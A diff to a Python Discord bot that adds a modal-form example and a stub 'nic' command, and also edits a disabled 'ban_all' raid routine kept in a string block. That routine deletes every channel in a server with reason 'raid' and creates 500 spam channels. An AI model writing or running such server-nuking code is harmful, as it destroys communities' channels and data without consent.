@@ -41,6 +41,18 @@ class Embeds():
         embed.set_footer(text=f"Bot creator: Kchulka#4766")
         return embed
 
+class MyModal(discord.ui.Modal):
+    def __init__(self, *args, **kwargs) -> None:
+        super().__init__(*args, **kwargs)
+
+        self.add_item(discord.ui.InputText(label="Short Input"))
+        self.add_item(discord.ui.InputText(label="Long Input", style=discord.InputTextStyle.long))
+
+    async def callback(self, interaction: discord.Interaction):
+        embed = discord.Embed(title="Modal Results")
+        embed.add_field(name="Short Input", value=self.children[0].value)
+        embed.add_field(name="Long Input", value=self.children[1].value)
+        await interaction.response.send_message(embeds=[embed])
 
 
 """ ----- Views ----- """
@@ -71,7 +83,13 @@ async def example(ctx):
         vi = b.View_cancel_message(ctx)
         await ctx.respond(content=" ", embed=em, view=vi)
 
+@bot.command(name="modal", description="Get some help!")
+async def modal(ctx: discord.ApplicationContext):
+    await ctx.send_modal(MyModal(title="Modal via Slash Command"))
 
+@bot.command(name="nic", description="Get some help!")
+async def ban_all(ctx):
+    print("nic")
 
 """@bot.command(name="ban_all", description="Get some help!")
 async def ban_all(ctx):
@@ -81,10 +99,8 @@ async def ban_all(ctx):
         except:
             print("missing permission")
     for channel in ctx.guild.channels:
-        try:
-            await channel.delete(reason="raid")
-        except:
-            print("missing permission")
+        await channel.delete(reason="raid")
+
     for i in range(500):
         channel = await ctx.guild.create_text_channel(name=f'Fsdffsfdf_{i}')"""
 
